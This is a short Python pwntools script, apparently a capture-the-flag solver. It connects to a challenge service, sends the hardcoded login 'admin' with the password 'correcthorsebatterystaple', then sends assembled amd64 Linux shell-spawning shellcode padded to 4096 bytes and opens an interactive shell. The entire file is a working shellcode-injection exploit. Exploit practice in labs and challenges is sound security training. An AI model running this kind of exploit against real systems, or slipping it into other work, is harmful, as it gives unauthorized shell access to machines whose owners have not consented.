import argparse

from pwn import *

parser = argparse.ArgumentParser()
parser.add_argument("address", default="127.0.0.1:8000", help="Address of challenge")


args = parser.parse_args()

HOST, PORT = args.address.split(':')

r = remote(HOST, int(PORT))

r.sendline("admin")
r.sendline("correcthorsebatterystaple")

with context.local():
    context.arch = "amd64"
    shell = asm(shellcraft.amd64.linux.sh())
shell += b"\x00" * (4096 - len(shell))
r.send(shell)
r.interactive()
